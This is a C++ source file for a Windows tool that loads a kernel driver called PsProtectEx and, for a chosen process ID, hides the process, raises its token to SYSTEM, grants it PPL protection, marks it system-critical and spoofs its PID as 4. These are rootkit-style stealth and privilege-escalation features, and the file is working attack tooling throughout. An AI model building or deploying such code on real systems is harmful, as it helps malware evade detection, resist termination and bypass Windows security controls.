#include <iostream>
#include <string>
#include <Winsock2.h>
#include <cstdlib>
#include <thread>
#include <Windows.h>
#include <fstream>
#include <cstdio>
#include <tchar.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <fstream>
#include <comdef.h>
#include <Wbemidl.h>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <ctime>
#include "ezpdb.hpp"

#define IOCTL_OFFSET_Protection            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OFFSET_UniqueProcessId       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OFFSET_ApcQueueable          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OFFSET_ActiveProcessLinks    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_Hide_Process                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SET_PID4                     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_Set_PPL                      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_Token_Up                     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_Set_Critical                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ApcQueueable                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
LPCWSTR Title = L"MMSL";

BOOL LoadDriver()
{
    WCHAR path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);

    WCHAR* pos = wcsrchr(path, L'\\');
    if (!pos) {
        MessageBox(NULL, L"Failed to load Driver", L"MMSL", MB_OK | MB_ICONERROR);
        return 1;
    }

    wcscpy(pos + 1, L"PsProtectEx.sys");

    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        MessageBox(NULL, L"Failed to load Driver", L"MMSL", MB_OK | MB_ICONERROR);
        return 1;
    }

    SC_HANDLE hService = CreateServiceW(
        hSCManager,
        L"PsProtectEx",
        L"PsProtectEx Service",
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        path,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (!hService) {
        hService = OpenServiceW(hSCManager, L"PsProtectEx", SERVICE_ALL_ACCESS);
        if (!hService) {
            MessageBox(NULL, L"Failed to load Driver", L"MMSL", MB_OK | MB_ICONERROR);
            CloseServiceHandle(hSCManager);
            return 1;
        }
    }
    if (!StartServiceW(hService, 0, NULL)) {
        MessageBox(NULL, L"Failed to load Driver", L"MMSL", MB_OK | MB_ICONERROR);
    }
    else {
    }
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return TRUE;
}

BOOL ParserSymbol()
{
    std::string ntos_path = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
    ez::pdb ntos_pdb = ez::pdb(ntos_path);
    if (ntos_pdb.init())
    {
        int Protection = ntos_pdb.get_attribute_offset("_EPROCESS", L"Protection");
        int ApcQueueable = ntos_pdb.get_attribute_offset("_KTHREAD", L"ApcQueueable");
        int UniqueProcessId = ntos_pdb.get_attribute_offset("_EPROCESS", L"UniqueProcessId");
        int ActiveProcessLinks = ntos_pdb.get_attribute_offset("_EPROCESS", L"ActiveProcessLinks");
        printf("UniqueProcessId = 0x%x\n", UniqueProcessId);
        printf("ActiveProcessLinks = 0x%x\n", ActiveProcessLinks);
        printf("Protection = 0x%x\n", Protection);
        printf("ApcQueueable = 0x%x\n", ApcQueueable);
        HANDLE hDevice;
        TCHAR szDeviceName[] = TEXT("\\\\.\\PsProtectEx");
        hDevice = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hDevice == INVALID_HANDLE_VALUE) {
            LPCWSTR msg = L"Failed To Open Driver!\n";
            MessageBoxW(NULL, msg, Title, MB_OK);
            printf("Failed to open device. Error %ld\n", GetLastError());
            return 1;
        }
        DWORD bytesReturned;
        DeviceIoControl(hDevice, IOCTL_OFFSET_Protection, &Protection, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
        DeviceIoControl(hDevice, IOCTL_OFFSET_UniqueProcessId, &UniqueProcessId, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
        DeviceIoControl(hDevice, IOCTL_OFFSET_ApcQueueable, &ApcQueueable, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
        DeviceIoControl(hDevice, IOCTL_OFFSET_ActiveProcessLinks, &ActiveProcessLinks, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
        CloseHandle(hDevice);
    }
}
BOOL INITSymbol()
{
    LPCWSTR msg = L"whether to download symbols?\n";
    int result = MessageBoxW(NULL, msg, TEXT("Download SYMBOL"), MB_YESNO | MB_ICONQUESTION);

    if (result == IDYES) {
        ParserSymbol();
    }
    else if (result == IDNO) {
        printf("No Download Symbol\n");
    }
    return TRUE;
}
int main()
{
    LoadDriver();
    INITSymbol();
    DWORD pid;
    HANDLE hDevice;
    TCHAR szDeviceName[] = TEXT("\\\\.\\PsProtectEx");

    hDevice = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        LPCWSTR msg = L"Failed To Open Driver!\n";
        MessageBoxW(NULL, msg, Title, MB_OK);
        printf("Failed to open device. Error %ld\n", GetLastError());
        return 1;
    }

    printf("Enter PID To Protect/Hidden: ");
    std::cin >> pid;

    DWORD bytesReturned;

    LPCWSTR SetPPLmsg = L"whether to Set PPL\n";
    int SetPPL = MessageBoxW(NULL, SetPPLmsg, TEXT("Set PPL"), MB_YESNO | MB_ICONQUESTION);
    if (SetPPL == IDYES) {
        DeviceIoControl(hDevice, IOCTL_Set_PPL, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
    }
    else if (SetPPL == IDNO) {
        printf("No Set PPL\n");
    }

    LPCWSTR Tokenmsg = L"whether to Token Level To SYSTEM\n";
    int Token = MessageBoxW(NULL, Tokenmsg, TEXT("Token"), MB_YESNO | MB_ICONQUESTION);
    if (Token == IDYES) {
        DeviceIoControl(hDevice, IOCTL_Token_Up, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
    }
    else if (Token == IDNO) {
        printf("No Set Token\n");
    }

    LPCWSTR Scpmsg = L"whether to Set System Critical Process\n";
    int Scp = MessageBoxW(NULL, Scpmsg, TEXT("Set System Critical Process"), MB_YESNO | MB_ICONQUESTION);
    if (Scp == IDYES) {
        DeviceIoControl(hDevice, IOCTL_Set_Critical, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
    }
    else if (Scp == IDNO) {
        printf("No Set System Critical Process\n");
    }

    LPCWSTR Apcmsg = L"whether to Queueable Apc(PatchGuard WARNING!!!)\n";
    int Apc = MessageBoxW(NULL, Apcmsg, TEXT("Queueable Apc"), MB_YESNO | MB_ICONQUESTION);
    if (Apc == IDYES) {
        DeviceIoControl(hDevice, IOCTL_ApcQueueable, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
    }
    else if (Apc == IDNO) {
        printf("No Queueable Apc\n");
    }

    LPCWSTR S4msg = L"whether to Set PID 4\n";
    int S4 = MessageBoxW(NULL, S4msg, TEXT("Set Pid 4"), MB_YESNO | MB_ICONQUESTION);
    if (S4 == IDYES) {
        DeviceIoControl(hDevice, IOCTL_SET_PID4, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
        pid = 4;
    }
    else if (S4 == IDNO) {
        printf("No Set Pid 4\n");
    }

    LPCWSTR Hidemsg = L"whether to Hide(PatchGuard WARNING!!!)\n";
    int Hide = MessageBoxW(NULL, Hidemsg, TEXT("Hide"), MB_YESNO | MB_ICONQUESTION);
    if (Hide == IDYES) {
        DeviceIoControl(hDevice, IOCTL_Hide_Process, &pid, sizeof(DWORD), NULL, 0, &bytesReturned, NULL);
    }
    else if (Hide == IDNO) {
        printf("No Hide\n");
    }

    CloseHandle(hDevice);
}